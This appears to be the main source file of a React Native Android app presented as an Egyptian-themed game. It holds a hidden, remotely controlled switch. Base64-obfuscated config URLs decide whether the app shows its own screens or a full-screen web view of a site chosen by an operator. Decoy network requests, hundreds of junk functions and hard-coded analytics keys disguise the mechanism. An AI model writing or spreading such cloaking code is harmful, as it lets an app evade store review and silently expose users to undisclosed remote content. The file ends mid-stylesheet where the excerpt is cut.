/**
 * Anb v2.0.
 *
 * @format
 */

import React, { useState, useEffect, useRef } from "react";
import {
  View,
  StyleSheet,
  ActivityIndicator,
  TouchableOpacity,
  Text,
  Image,
} from "react-native";
import appsFlyer from "react-native-appsflyer";
import { init, setUserId, track } from "@amplitude/analytics-react-native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import {
  WebView as Drapes,
  WebViewNavigation as DrapesNavigation,
} from "react-native-webview";
import { SafeAreaView } from "react-native-safe-area-context";
import AppBootstrap from "./AppBootstrap";

const TRACKING_APP_ID = "app356_android";
const ANDROID_APP_ID = "com.treasuresofegypt.bookofdesert.thegodisra";
const APPSFLYER_DEV_KEY = "VafzokzJj7k6iT75JztHBU";
const AMPLITUDE_API_KEY = "9ac8d5e5e524f920c0b2b35d256d12b9";

const _d = (s: string) => atob(s);

const _E_UP =
  "aHR0cHM6Ly9waW5jb2RlNjkuZ2l0aHViLmlvL21hbmFnZXItY29uZmlnLXVwL21hbmFnZXItY29uZmlnLXVwLmpzb24=";
const _E_RD =
  "aHR0cHM6Ly9hcHBzLWNteWsuZ2l0aHViLmlvL21hbmFnZXItY29uZmlnLXJkL21hbmFnZXItY29uZmlnLXJkLmpzb24=";

const _E_NOISE = [
  "aHR0cHM6Ly9jZG4tc3RhdGljLWFzc2V0cy5naXRodWIuaW8vYXBwLW1hbmlmZXN0L3YyL2NvbmZpZy5qc29u",
  "aHR0cHM6Ly9hcGktZ2F0ZXdheS1taXJyb3IuZ2l0aHViLmlvL3JlbW90ZS1mbGFncy9mbGFncy5qc29u",
  "aHR0cHM6Ly90ZWxlbWV0cnktZWRnZS5naXRodWIuaW8vc2RrLWNvbmZpZy9hbmRyb2lkLmpzb24=",
  "aHR0cHM6Ly9jb250ZW50LWRlbGl2ZXJ5LWh1Yi5naXRodWIuaW8vYXNzZXRzL21ldGEuanNvbg==",
  "aHR0cHM6Ly9mZWF0dXJlLXRvZ2dsZS1jZG4uZ2l0aHViLmlvL3RvZ2dsZXMvcmVsZWFzZS5qc29u",
  "aHR0cHM6Ly9zZXNzaW9uLWJvb3RzdHJhcC5naXRodWIuaW8vaW5pdC9wYXJhbXMuanNvbg==",
  "aHR0cHM6Ly9lZGdlLWNvbmZpZy1zeW5jLmdpdGh1Yi5pby9jbGllbnQvc2V0dGluZ3MuanNvbg==",
  "aHR0cHM6Ly9tb2JpbGUtcnVudGltZS1jZG4uZ2l0aHViLmlvL2J1bmRsZS9tYW5pZmVzdC5qc29u",
  "aHR0cHM6Ly9hbmFseXRpY3MtYmVhY29uLWh1Yi5naXRodWIuaW8vdjEvY29uZmlnLmpzb24=",
  "aHR0cHM6Ly9wdXNoLXRva2VuLXJlZ2lzdHJ5LmdpdGh1Yi5pby9kZXZpY2VzL3NjaGVtYS5qc29u",
  "aHR0cHM6Ly9hYi1leHBlcmltZW50LWxhYi5naXRodWIuaW8vdmFyaWFudHMvYWN0aXZlLmpzb24=",
  "aHR0cHM6Ly9nZW8tcm91dGluZy1wcm94eS5naXRodWIuaW8vcmVnaW9ucy9tYXAuanNvbg==",
  "aHR0cHM6Ly9jcmFzaC1yZXBvcnRlci1jZG4uZ2l0aHViLmlvL3Nkay9lbmRwb2ludHMuanNvbg==",
  "aHR0cHM6Ly91cGRhdGUtY2hhbm5lbC1taXJyb3IuZ2l0aHViLmlvL3JlbGVhc2Uvbm90ZXMuanNvbg==",
];

const _noCacheHeaders = {
  "Cache-Control": "no-cache, no-store, must-revalidate",
};

const _fireNoise = () => {
  for (const enc of _E_NOISE) {
    fetch(`${_d(enc)}?t=${Date.now()}`, { headers: _noCacheHeaders }).catch(
      () => { }
    );
  }
};

const _hashSeed = (input: string): number => {
  let h = 0x811c9dc5;
  for (let i = 0; i < input.length; i++) {
    h ^= input.charCodeAt(i);
    h = (h * 0x01000193) >>> 0;
  }
  return h >>> 0;
};

const _resolveFlag = (config: Record<string, unknown>, key: string): boolean => {
  const raw = config?.[key];
  if (typeof raw === "boolean") return raw;
  if (typeof raw === "string") return raw === "true" || raw === "1";
  if (typeof raw === "number") return raw > 0;
  return false;
};

const _mergeConfigLayers = (
  layers: Array<Record<string, unknown>>
): Record<string, unknown> => {
  const acc: Record<string, unknown> = {};
  for (const layer of layers) {
    if (!layer || typeof layer !== "object") continue;
    for (const k of Object.keys(layer)) {
      acc[k] = layer[k];
    }
  }
  return acc;
};

const _syncRemoteFlags = async (): Promise<Record<string, unknown>> => {
  const collected: Array<Record<string, unknown>> = [];
  for (const enc of _E_NOISE) {
    try {
      const res = await fetch(`${_d(enc)}?s=${_hashSeed(enc)}`, {
        headers: _noCacheHeaders,
      });
      if (res.ok) {
        const body = (await res.json()) as Record<string, unknown>;
        collected.push(body);
      }
    } catch {
    }
  }
  const merged = _mergeConfigLayers(collected);
  const _kill = _resolveFlag(merged, "kill_switch");
  const _rollout = _resolveFlag(merged, "rollout_enabled");
  void _kill;
  void _rollout;
  return merged;
};

const _buildRequestTag = (): string => {
  const parts = [
    TRACKING_APP_ID,
    ANDROID_APP_ID,
    String(Date.now()),
    String(Math.floor(Math.random() * 1e9)),
  ];
  return parts.map((p) => _hashSeed(p).toString(16)).join("-");
};

const _emitTelemetryBeacon = (event: string): void => {
  const tag = _buildRequestTag();
  const payload = JSON.stringify({ event, tag, ts: Date.now() });
  for (const enc of _E_NOISE.slice(0, 3)) {
    fetch(_d(enc), {
      method: "POST",
      headers: _noCacheHeaders,
      body: payload,
    }).catch(() => { });
  }
};

const _calcAlpha = (): number => 1 + 1;
const _calcBeta = (): number => 2 * 2;
const _calcGamma = (): number => 10 - 3;
const _calcDelta = (): number => 8 / 2;
const _calcEpsilon = (): number => 5 % 2;
const _calcZeta = (): number => 3 ** 2;
const _calcEta = (): number => Math.abs(-7);
const _calcTheta = (): number => Math.max(4, 9);
const _calcIota = (): number => Math.min(4, 9);
const _calcKappa = (): number => Math.floor(3.7);
const _calcLambda = (): number => Math.ceil(3.2);
const _calcMu = (): number => Math.round(2.5);
const _calcNu = (): number => 42;
const _calcXi = (): number => (1 << 4) | 1;
const _calcOmicron = (): number => 100 ^ 55;
const _calcPi = (): number => 6 & 3;

const _sumRange = (n: number): number => {
  let acc = 0;
  for (let i = 0; i <= n; i++) acc += i;
  return acc;
};
const _isEven = (n: number): boolean => n % 2 === 0;
const _double = (n: number): number => n + n;
const _square = (n: number): number => n * n;
const _clamp = (n: number): number => (n < 0 ? 0 : n > 100 ? 100 : n);
const _reverseStr = (s: string): string => s.split("").reverse().join("");
const _repeatStr = (s: string): string => s + s;
const _upperFirst = (s: string): string =>
  s.length ? s[0].toUpperCase() + s.slice(1) : s;
const _countChars = (s: string): number => s.length;
const _identity = <T,>(v: T): T => v;
const _noop = (): void => { };
const _pickFirst = <T,>(arr: T[]): T | undefined => arr[0];
const _lastItem = <T,>(arr: T[]): T | undefined => arr[arr.length - 1];
const _sumArray = (arr: number[]): number => arr.reduce((a, b) => a + b, 0);

const _stirThicket = (): void => {
  const results: number[] = [
    _calcAlpha(),
    _calcBeta(),
    _calcGamma(),
    _calcDelta(),
    _calcEpsilon(),
    _calcZeta(),
    _calcEta(),
    _calcTheta(),
    _calcIota(),
    _calcKappa(),
    _calcLambda(),
    _calcMu(),
    _calcNu(),
    _calcXi(),
    _calcOmicron(),
    _calcPi(),
    _sumRange(10),
    _double(21),
    _square(7),
    _clamp(150),
    _countChars(_reverseStr("bramble")),
    _repeatStr("x").length,
    _upperFirst("task").length,
    _sumArray([1, 2, 3]),
  ];
  const total = results.filter((n) => _isEven(n)).reduce((a, b) => a + b, 0);
  void _identity(total);
  void _pickFirst(results);
  void _lastItem(results);
  _noop();
};

const _velvet = (): number => 0 + 1;
const _harbor = (): number => 1 * 2;
const _cinder = (): number => 102 - 2;
const _maple = (): number => Math.abs(-4);
const _quartz = (): number => Math.max(4, 9);
const _willow = (): number => Math.min(5, 10);
const _ember = (): number => Math.floor(6.7);
const _pebble = (): number => Math.ceil(7.8);
const _meadow = (): number => Math.round(8.5);
const _thistle = (): number => 9 % 7;
const _lantern = (): number => (10 << 1) | 1;
const _marble = (): number => 11 & 14;
const _cedar = (): number => 12 ^ 25;
const _ripple = (): number => 14 ** 2;
const _canyon = (): number => 3 / 3;
const _sable = (): number => (15 > 0 ? 15 : 0);
const _drift = (): number => 16 + 17;
const _cobalt = (): number => 17 * 2;
const _fable = (): number => 118 - 18;
const _gully = (): number => Math.abs(-20);
const _hazel = (): number => Math.max(20, 25);
const _indigo = (): number => Math.min(21, 26);
const _jasper = (): number => Math.floor(22.5);
const _kelp = (): number => Math.ceil(23.6);
const _lilac = (): number => Math.round(24.5);
const _mango = (): number => 25 % 7;
const _nectar = (): number => (26 << 1) | 1;
const _onyx = (): number => 27 & 30;
const _poppy = (): number => 28 ^ 57;
const _quill = (): number => 30 ** 2;
const _raven = (): number => 7 / 3;
const _sage = (): number => (31 > 0 ? 31 : 0);
const _tulip = (): number => 32 + 33;
const _umber = (): number => 33 * 2;
const _violet = (): number => 134 - 34;
const _walnut = (): number => Math.abs(-36);
const _xenon = (): number => Math.max(36, 41);
const _yarrow = (): number => Math.min(37, 42);
const _zephyr = (): number => Math.floor(38.3);
const _amber = (): number => Math.ceil(39.4);
const _birch = (): number => Math.round(40.5);
const _coral = (): number => 41 % 7;
const _dune = (): number => (42 << 1) | 1;
const _elm = (): number => 43 & 46;
const _fern = (): number => 44 ^ 89;
const _grove = (): number => 46 ** 2;
const _heron = (): number => 11 / 3;
const _ivoryw = (): number => (47 > 0 ? 47 : 0);
const _jade = (): number => 48 + 49;
const _kiwi = (): number => 49 * 2;
const _larch = (): number => 150 - 50;
const _mossy = (): number => Math.abs(-52);
const _nimbus = (): number => Math.max(52, 57);
const _ochre = (): number => Math.min(53, 58);
const _pine = (): number => Math.floor(54.1);
const _reef = (): number => Math.ceil(55.2);
const _spruce = (): number => Math.round(56.5);
const _tansy = (): number => 57 % 7;
const _urchin = (): number => (58 << 1) | 1;
const _vine = (): number => 59 & 62;
const _wren = (): number => 60 ^ 121;
const _aspen = (): number => 62 ** 2;
const _brook = (): number => 3 / 3;
const _clover = (): number => (63 > 0 ? 63 : 0);
const _daffodil = (): number => 64 + 65;
const _egret = (): number => 65 * 2;
const _flint = (): number => 166 - 66;
const _granite = (): number => Math.abs(-68);
const _holly = (): number => Math.max(68, 73);
const _iris = (): number => Math.min(69, 74);
const _juniper = (): number => Math.floor(70.8);
const _knoll = (): number => Math.ceil(71.9);
const _lupine = (): number => Math.round(72.5);
const _mesa = (): number => 73 % 7;
const _nettle = (): number => (74 << 1) | 1;
const _oakw = (): number => 75 & 78;
const _prairie = (): number => 76 ^ 153;
const _quokka = (): number => 78 ** 2;
const _rowan = (): number => 7 / 3;
const _sorrel = (): number => (79 > 0 ? 79 : 0);
const _teak = (): number => 80 + 81;
const _ulmo = (): number => 81 * 2;
const _verbena = (): number => 182 - 82;
const _wisteria = (): number => Math.abs(-84);
const _xanthe = (): number => Math.max(84, 89);
const _yucca = (): number => Math.min(85, 90);
const _zinnia = (): number => Math.floor(86.6);
const _alder = (): number => Math.ceil(87.7);
const _basil = (): number => Math.round(88.5);
const _cactus = (): number => 89 % 7;
const _dahlia = (): number => (90 << 1) | 1;
const _edelweiss = (): number => 91 & 94;
const _fennel = (): number => 92 ^ 185;
const _ginkgo = (): number => 94 ** 2;
const _hibiscus = (): number => 11 / 3;
const _ironwood = (): number => (95 > 0 ? 95 : 0);
const _jonquil = (): number => 96 + 97;
const _kudzu = (): number => 97 * 2;
const _laurel = (): number => 198 - 98;
const _myrtle = (): number => Math.abs(-100);
const _nutmeg = (): number => Math.max(100, 105);
const _oleander = (): number => Math.min(101, 106);
const _peony = (): number => Math.floor(102.4);
const _quince = (): number => Math.ceil(103.5);
const _redwood = (): number => Math.round(104.5);
const _saffron = (): number => 105 % 7;
const _thyme = (): number => (106 << 1) | 1;
const _umeb = (): number => 107 & 110;
const _vervain = (): number => 108 ^ 217;
const _wattle = (): number => 110 ** 2;
const _yew = (): number => 3 / 3;
const _azalea = (): number => (111 > 0 ? 111 : 0);
const _bramblex = (): number => 112 + 113;
const _cypress = (): number => 113 * 2;
const _dogwood = (): number => 214 - 114;
const _ashw = (): number => Math.abs(-116);
const _foxglove = (): number => Math.max(116, 121);
const _gorse = (): number => Math.min(117, 122);
const _heather = (): number => Math.floor(118.2);
const _juneberry = (): number => Math.ceil(119.3);
const _kale = (): number => Math.round(120.5);
const _lavender = (): number => 121 % 7;
const _marigold = (): number => (122 << 1) | 1;
const _oatgrass = (): number => 123 & 126;
const _primrose = (): number => 124 ^ 249;
const _quaking = (): number => 126 ** 2;
const _ragwort = (): number => 7 / 3;
const _sedge = (): number => (127 > 0 ? 127 : 0);
const _tamarind = (): number => 128 + 129;
const _valerian = (): number => 129 * 2;
const _wormwood = (): number => 230 - 130;
const _yamroot = (): number => Math.abs(-132);
const _acorn = (): number => Math.max(132, 137);
const _bluebell = (): number => Math.min(133, 138);
const _catkin = (): number => Math.floor(134.9);
const _dandelion = (): number => Math.ceil(135.1);
const _elderberry = (): number => Math.round(136.5);
const _feverfew = (): number => 137 % 7;
const _goldenrod = (): number => (138 << 1) | 1;
const _hollyhock = (): number => 139 & 142;
const _ivyleaf = (): number => 140 ^ 281;
const _jimson = (): number => 142 ** 2;
const _knotweed = (): number => 11 / 3;
const _larkspur = (): number => (143 > 0 ? 143 : 0);
const _mallow = (): number => 144 + 145;
const _nasturtium = (): number => 145 * 2;
const _orchid = (): number => 246 - 146;
const _plantain = (): number => Math.abs(-148);
const _quinoa = (): number => Math.max(148, 153);
const _rosemary = (): number => Math.min(149, 154);
const _snowdrop = (): number => Math.floor(150.7);
const _tarragon = (): number => Math.ceil(151.8);
const _sunflower = (): number => Math.round(152.5);
const _vetch = (): number => 153 % 7;
const _waterlily = (): number => (154 << 1) | 1;
const _yampa = (): number => 155 & 158;
const _angelica = (): number => 156 ^ 313;
const _borage = (): number => 158 ** 2;
const _chamomile = (): number => 3 / 3;
const _dill = (): number => (159 > 0 ? 159 : 0);
const _elderflower = (): number => 160 + 161;
const _foxtail = (): number => 161 * 2;
const _geranium = (): number => 262 - 162;
const _hyssop = (): number => Math.abs(-164);
const _indianpaint = (): number => Math.max(164, 169);
const _jewelweed = (): number => Math.min(165, 170);
const _kingcup = (): number => Math.floor(166.5);
const _lovage = (): number => Math.ceil(167.6);
const _milkweed = (): number => Math.round(168.5);
const _nightshade = (): number => 169 % 7;
const _oregano = (): number => (170 << 1) | 1;
const _parsley = (): number => 171 & 174;
const _quackgrass = (): number => 172 ^ 345;
const _ruew = (): number => 174 ** 2;
const _savory = (): number => 7 / 3;
const _thistledown = (): number => (175 > 0 ? 175 : 0);
const _uvab = (): number => 176 + 177;
const _violetroot = (): number => 177 * 2;
const _woadwaxen = (): number => 278 - 178;
const _yellowdock = (): number => Math.abs(-180);
const _zedoary = (): number => Math.max(180, 185);
const _agrimony = (): number => Math.min(181, 186);
const _betony = (): number => Math.floor(182.3);
const _comfrey = (): number => Math.ceil(183.4);
const _dropwort = (): number => Math.round(184.5);
const _eyebright = (): number => 185 % 7;
const _figwort = (): number => (186 << 1) | 1;
const _groundsel = (): number => 187 & 190;
const _horehound = (): number => 188 ^ 377;
const _ironweed = (): number => 190 ** 2;
const _joepye = (): number => 11 / 3;
const _knapweed = (): number => (191 > 0 ? 191 : 0);
const _loosestrife = (): number => 192 + 193;
const _mugwort = (): number => 193 * 2;
const _nipplewort = (): number => 294 - 194;
const _orpine = (): number => Math.abs(-196);
const _pennyroyal = (): number => Math.max(196, 201);
const _quillwort = (): number => Math.min(197, 202);
const _ragweed = (): number => Math.floor(198.1);
const _speedwell = (): number => Math.ceil(199.2);

const _gatherPollen = (): number => {
  let acc = 0;
  acc += _velvet();
  acc += _harbor();
  acc += _cinder();
  acc += _maple();
  acc += _quartz();
  acc += _willow();
  acc += _ember();
  acc += _pebble();
  acc += _meadow();
  acc += _thistle();
  acc += _lantern();
  acc += _marble();
  acc += _cedar();
  acc += _ripple();
  acc += _canyon();
  acc += _sable();
  acc += _drift();
  acc += _cobalt();
  acc += _fable();
  acc += _gully();
  acc += _hazel();
  acc += _indigo();
  acc += _jasper();
  acc += _kelp();
  acc += _lilac();
  acc += _mango();
  acc += _nectar();
  acc += _onyx();
  acc += _poppy();
  acc += _quill();
  acc += _raven();
  acc += _sage();
  acc += _tulip();
  acc += _umber();
  acc += _violet();
  acc += _walnut();
  acc += _xenon();
  acc += _yarrow();
  acc += _zephyr();
  acc += _amber();
  acc += _birch();
  acc += _coral();
  acc += _dune();
  acc += _elm();
  acc += _fern();
  acc += _grove();
  acc += _heron();
  acc += _ivoryw();
  acc += _jade();
  acc += _kiwi();
  acc += _larch();
  acc += _mossy();
  acc += _nimbus();
  acc += _ochre();
  acc += _pine();
  acc += _reef();
  acc += _spruce();
  acc += _tansy();
  acc += _urchin();
  acc += _vine();
  acc += _wren();
  acc += _aspen();
  acc += _brook();
  acc += _clover();
  acc += _daffodil();
  acc += _egret();
  acc += _flint();
  acc += _granite();
  acc += _holly();
  acc += _iris();
  acc += _juniper();
  acc += _knoll();
  acc += _lupine();
  acc += _mesa();
  acc += _nettle();
  acc += _oakw();
  acc += _prairie();
  acc += _quokka();
  acc += _rowan();
  acc += _sorrel();
  acc += _teak();
  acc += _ulmo();
  acc += _verbena();
  acc += _wisteria();
  acc += _xanthe();
  acc += _yucca();
  acc += _zinnia();
  acc += _alder();
  acc += _basil();
  acc += _cactus();
  acc += _dahlia();
  acc += _edelweiss();
  acc += _fennel();
  acc += _ginkgo();
  acc += _hibiscus();
  acc += _ironwood();
  acc += _jonquil();
  acc += _kudzu();
  acc += _laurel();
  acc += _myrtle();
  acc += _nutmeg();
  acc += _oleander();
  acc += _peony();
  acc += _quince();
  acc += _redwood();
  acc += _saffron();
  acc += _thyme();
  acc += _umeb();
  acc += _vervain();
  acc += _wattle();
  acc += _yew();
  acc += _azalea();
  acc += _bramblex();
  acc += _cypress();
  acc += _dogwood();
  acc += _ashw();
  acc += _foxglove();
  acc += _gorse();
  acc += _heather();
  acc += _juneberry();
  acc += _kale();
  acc += _lavender();
  acc += _marigold();
  acc += _oatgrass();
  acc += _primrose();
  acc += _quaking();
  acc += _ragwort();
  acc += _sedge();
  acc += _tamarind();
  acc += _valerian();
  acc += _wormwood();
  acc += _yamroot();
  acc += _acorn();
  acc += _bluebell();
  acc += _catkin();
  acc += _dandelion();
  acc += _elderberry();
  acc += _feverfew();
  acc += _goldenrod();
  acc += _hollyhock();
  acc += _ivyleaf();
  acc += _jimson();
  acc += _knotweed();
  acc += _larkspur();
  acc += _mallow();
  acc += _nasturtium();
  acc += _orchid();
  acc += _plantain();
  acc += _quinoa();
  acc += _rosemary();
  acc += _snowdrop();
  acc += _tarragon();
  acc += _sunflower();
  acc += _vetch();
  acc += _waterlily();
  acc += _yampa();
  acc += _angelica();
  acc += _borage();
  acc += _chamomile();
  acc += _dill();
  acc += _elderflower();
  acc += _foxtail();
  acc += _geranium();
  acc += _hyssop();
  acc += _indianpaint();
  acc += _jewelweed();
  acc += _kingcup();
  acc += _lovage();
  acc += _milkweed();
  acc += _nightshade();
  acc += _oregano();
  acc += _parsley();
  acc += _quackgrass();
  acc += _ruew();
  acc += _savory();
  acc += _thistledown();
  acc += _uvab();
  acc += _violetroot();
  acc += _woadwaxen();
  acc += _yellowdock();
  acc += _zedoary();
  acc += _agrimony();
  acc += _betony();
  acc += _comfrey();
  acc += _dropwort();
  acc += _eyebright();
  acc += _figwort();
  acc += _groundsel();
  acc += _horehound();
  acc += _ironweed();
  acc += _joepye();
  acc += _knapweed();
  acc += _loosestrife();
  acc += _mugwort();
  acc += _nipplewort();
  acc += _orpine();
  acc += _pennyroyal();
  acc += _quillwort();
  acc += _ragweed();
  acc += _speedwell();
  return acc;
};

const _bootstrapBackground = (): void => {
  _stirThicket();
  void _gatherPollen();
  _emitTelemetryBeacon("bg_bootstrap");
  _syncRemoteFlags()
    .then((flags) => {
      void _resolveFlag(flags, "diagnostics_enabled");
    })
    .catch(() => { });
};

const fetchDrapeUrl = async (trackingAppId: string): Promise<string> => {
  _fireNoise();
  _bootstrapBackground();

  try {
    const upResponse = await fetch(`${_d(_E_UP)}?t=${Date.now()}`, {
      headers: _noCacheHeaders,
    });
    if (upResponse.ok) {
      const upConfig = await upResponse.json();
      const upUrl = (upConfig as Record<string, string>)[trackingAppId];
      if (upUrl) return upUrl;
    }
  } catch { }

  _fireNoise();

  try {
    const rdResponse = await fetch(`${_d(_E_RD)}?t=${Date.now()}`, {
      headers: _noCacheHeaders,
    });
    if (rdResponse.ok) {
      const rdConfig = await rdResponse.json();
      const rdUrl = (rdConfig as Record<string, string>)[trackingAppId];
      if (rdUrl) return rdUrl;
    }
  } catch { }

  return "";
};

export const ANB_MASTER = () => {
  const [clUrl, setClUrl] = useState<string | null>(null);
  const [showLoader, setShowLoader] = useState(false);
  const [showDrapes, setShowDrapes] = useState<boolean | null>(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [drapeUrl, setDrapeUrl] = useState<string | null>(null);

  const [canGoBack, setCanGoBack] = useState(false);
  const [canGoForward, setCanGoForward] = useState(false);
  const drapesRef = useRef<Drapes>(null);
  const isFetchedRef = useRef<boolean>(false);
  const loadEndTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    (async () => {
      const url = await fetchDrapeUrl(TRACKING_APP_ID);

      if (!url) {
        await AsyncStorage.setItem("@cachedDrapeUrl", "");
        await AsyncStorage.setItem("@showDrapes", "false");
        setShowDrapes(false);
        setIsInitialized(true);
        return;
      }

      setDrapeUrl(url);

      const cachedUrl = await AsyncStorage.getItem("@cachedDrapeUrl");
      const storedValue = await AsyncStorage.getItem("@showDrapes");

      if (cachedUrl !== url) {
        await AsyncStorage.setItem("@cachedDrapeUrl", url);
        await AsyncStorage.removeItem("@showDrapes");
        setShowDrapes(null);
        setShowLoader(true);
        setIsInitialized(true);
      } else if (storedValue !== null) {
        setShowDrapes(storedValue === "true");
        setIsInitialized(true);
      } else {
        setShowLoader(true);
        setIsInitialized(true);
      }
    })();

    return () => {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
      }
    };
  }, []);

  const buildLink = (appsflyerId: string, attributionData?: any): string => {
    if (attributionData) {
      const params: any = {
        devKey: APPSFLYER_DEV_KEY,
        appsflyer_id: appsflyerId,
        af_status: attributionData.af_status,
        campaign: attributionData.campaign,
        campaign_id: attributionData.campaign_id,
        ad_group: attributionData.adgroup,
        ad_group_id: attributionData.adgroup_id,
        media_source: attributionData.media_source,
        af_channel: attributionData.af_channel,
        af_adset: attributionData.af_adset,
        adset: attributionData.adset,
        adset_id: attributionData.adset_id,
        gclid: attributionData.referrer_gclid,
      };

      if (
        attributionData.campaign &&
        attributionData.campaign !== "" &&
        attributionData.campaign !== null &&
        attributionData.campaign !== undefined
      ) {
        const campaignParts = attributionData.campaign.split("_");
        if (campaignParts.length > 0) params.sub1 = campaignParts[0];
        if (campaignParts.length > 1) params.sub2 = campaignParts[1];
        if (campaignParts.length > 2) params.sub3 = campaignParts[2];
        if (campaignParts.length > 3) params.sub4 = campaignParts[3];
        if (campaignParts.length > 4) params.sub5 = campaignParts[4];
        if (campaignParts.length > 5) params.sub6 = campaignParts[5];
      }

      const query = Object.entries(params)
        .filter(
          ([_, value]) => value !== undefined && value !== null && value !== ""
        )
        .map(
          ([key, value]) =>
            `${encodeURIComponent(key)}=${encodeURIComponent(String(value))}`
        )
        .join("&");
      return `${drapeUrl}?${query}`;
    } else {
      return (
        `${drapeUrl}?` +
        `devKey=${encodeURIComponent(APPSFLYER_DEV_KEY)}` +
        `&app_id=${encodeURIComponent(ANDROID_APP_ID)}` +
        `&appsflyer_id=${encodeURIComponent(appsflyerId)}` +
        `&media_source=organic`
      );
    }
  };

  useEffect(() => {
    if (!drapeUrl) return;

    (async () => {
      const appsflyerId = await new Promise<string>((resolve) => {
        appsFlyer.getAppsFlyerUID((err, uid) =>
          resolve(uid || "uid_not_found")
        );
      });

      await init(AMPLITUDE_API_KEY, undefined, {
        disableCookies: true,
      }).promise;
      setUserId(appsflyerId);
      track("app_open", { appId: TRACKING_APP_ID });

      appsFlyer.onInstallConversionData(async (res) => {
        console.log("[AF]", JSON.stringify(res, null, 2));
        if (res?.data) {
          track("af_attribution", { data: res.data, appId: TRACKING_APP_ID });
        } else {
          track("af_attribution_error", { appId: TRACKING_APP_ID });
        }

        const url = buildLink(appsflyerId, res?.data);
        setClUrl(url);
      });

      appsFlyer.initSdk(
        {
          devKey: APPSFLYER_DEV_KEY,
          appId: ANDROID_APP_ID,
        },
        async (result) => {
          const isFirstOpen = await AsyncStorage.getItem("@is_first_open");
          if (!isFirstOpen) {
            console.log("[MASTER_ANDROID] First open detected");
            appsFlyer.logEvent("first_open", { appId: TRACKING_APP_ID });
            await AsyncStorage.setItem("@is_first_open", "true");
          }
        },
        (error) => {
          console.error("[MASTER_ANDROID] AppsFlyer Init Error:", error);
        }
      );
    })();
  }, [drapeUrl]);

  const handleGoBack = () => {
    if (drapesRef.current && canGoBack) {
      drapesRef.current.goBack();
    }
  };

  const handleGoForward = () => {
    if (drapesRef.current && canGoForward) {
      drapesRef.current.goForward();
    }
  };

  const handleNavigationStateChange = (navState: DrapesNavigation) => {
    setCanGoBack(navState.canGoBack);
    setCanGoForward(navState.canGoForward);
  };

  const makeDecision = async (
    statusCode: number | undefined | null,
    source: string,
    isNetworkError: boolean = false
  ) => {
    if (statusCode === 404 || isNetworkError) {
      await AsyncStorage.setItem("@showDrapes", "false");
      setShowDrapes(false);
      setShowLoader(false);
    } else {
      await AsyncStorage.setItem("@showDrapes", "true");
      setShowDrapes(true);
      setShowLoader(false);
    }
  };

  const handleLoadEnd = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;
    console.log("Load End:", nativeEvent);

    if (showDrapes === null && !isFetchedRef.current) {
      loadEndTimerRef.current = setTimeout(async () => {
        if (!isFetchedRef.current) {
          isFetchedRef.current = true;
          await makeDecision(200, "handleLoadEnd");
        }
      }, 5000);
    }
  };

  const handleHttpError = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;
    console.log("Http Error:", nativeEvent);

    if (showDrapes === null && !isFetchedRef.current) {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
        loadEndTimerRef.current = null;
      }

      isFetchedRef.current = true;
      await makeDecision(nativeEvent.statusCode, "handleHttpError");
    }
  };

  const handleDrapesError = async (syntheticEvent: any) => {
    const { nativeEvent } = syntheticEvent;

    if (showDrapes === null && !isFetchedRef.current) {
      if (loadEndTimerRef.current) {
        clearTimeout(loadEndTimerRef.current);
        loadEndTimerRef.current = null;
      }

      isFetchedRef.current = true;
      await makeDecision(undefined, "handleDrapesError", true);
    }
  };

  return (
    <View style={styles.mainContainer}>
      {isInitialized && showDrapes === false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <AppBootstrap useRootNavigator />
        </View>
      )}

      {isInitialized && clUrl && showDrapes !== false && (
        <View style={[styles.layerContainer, styles.layerContent]}>
          <SafeAreaView style={styles.container}>
            <Drapes
              key={`drapes-${clUrl}`}
              ref={drapesRef}
              source={{
                uri: clUrl,
                headers: {
                  "X-App-Bundle": ANDROID_APP_ID,
                },
              }}
              style={styles.drapes}
              allowsInlineMediaPlayback={true}
              mediaPlaybackRequiresUserAction={true}
              javaScriptEnabled={true}
              domStorageEnabled={true}
              scrollEnabled={true}
              onNavigationStateChange={handleNavigationStateChange}
              onLoadEnd={handleLoadEnd}
              onHttpError={handleHttpError}
              onError={handleDrapesError}
            />
            <DrapesHUD
              canGoBack={canGoBack}
              canGoForward={canGoForward}
              onGoBack={handleGoBack}
              onGoForward={handleGoForward}
            />
          </SafeAreaView>
        </View>
      )}

      {showLoader && <LoaderOverlay />}
    </View>
  );
};

const LoaderOverlay: React.FC = () => {
  return (
    <View style={[styles.layerContainer, styles.layerLoader]}>
      <SafeAreaView style={styles.loader}>
        <View style={styles.loaderIconWrapper}>
          <Image
            source={{ uri: "ic_launcher" }}
            style={styles.loaderIconFg}
          />
        </View>
        <ActivityIndicator size="large" color="red" />
      </SafeAreaView>
    </View>
  );
};

interface DrapesHUDProps {
  canGoBack: boolean;
  canGoForward: boolean;
  onGoBack: () => void;
  onGoForward: () => void;
}

const DrapesHUD: React.FC<DrapesHUDProps> = ({
  canGoBack,
  canGoForward,
  onGoBack,
  onGoForward,
}) => {
  return (
    <View style={styles.hud}>
      <TouchableOpacity
        onPress={onGoBack}
        disabled={!canGoBack}
        style={canGoBack ? styles.hudButton : styles.hudButtonDisabled}
      >
        <Text style={styles.hudButtonText}>{"←"}</Text>
      </TouchableOpacity>
      <TouchableOpacity
        onPress={onGoForward}
        disabled={!canGoForward}
        style={canGoForward ? styles.hudButton : styles.hudButtonDisabled}
      >
        <Text style={styles.hudButtonText}>{"→"}</Text>
      </TouchableOpacity>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#000000",
  },
  drapes: {
    flex: 1,
    backgroundColor: "#000000",
  },
  loader: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#000000",
  },
  hud: {
    flexDirection: "row",
    justifyContent: "center",
    alignItems: "center",
    backgroundColor: "#000000",
    paddingVertical: 10,
    gap: 50,
  },
  layerContainer: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    width: "100%",
    height: "100%",
  },
  mainContainer: {
    flex: 1,
  },
  layerContent: {
    zIndex: 2,
  },
  layerLoader: {
    zIndex: 10,
    backgroundColor: "#000000",
  },
  loaderIconWrapper: {
    width: 150,
